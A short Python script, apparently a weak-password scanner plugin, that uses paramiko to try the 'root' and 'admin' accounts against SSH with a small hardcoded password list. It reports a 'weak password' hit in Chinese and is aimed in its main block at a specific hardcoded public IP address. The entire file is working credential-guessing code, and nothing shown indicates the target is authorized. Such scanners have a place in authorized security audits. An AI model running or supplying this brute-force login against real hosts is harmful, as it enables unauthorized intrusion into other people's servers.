from paramiko import SSHClient, AutoAddPolicy


def do(target):
    port = 22
    client = SSHClient()
    client.set_missing_host_key_policy(AutoAddPolicy())
    time_out_flag = 0
    for user in ['root', 'admin']:
        for pwd in ['asdada', 'asdasda', 'asdada', 'asdaa']:
            try:
                client.connect(target, port, user, pwd, timeout=5, auth_timeout=10)
                return True, ("弱口令:%s, %s" % (user, pwd))
            except Exception as e:
                if 'timed out' in str(e):
                    time_out_flag += 1
                if time_out_flag > 2:
                    print('connection timeout , break the loop .')
                    return False, ''
                print(e)
    return False, ''

if __name__ == '__main__':
    do('101.36.153.223')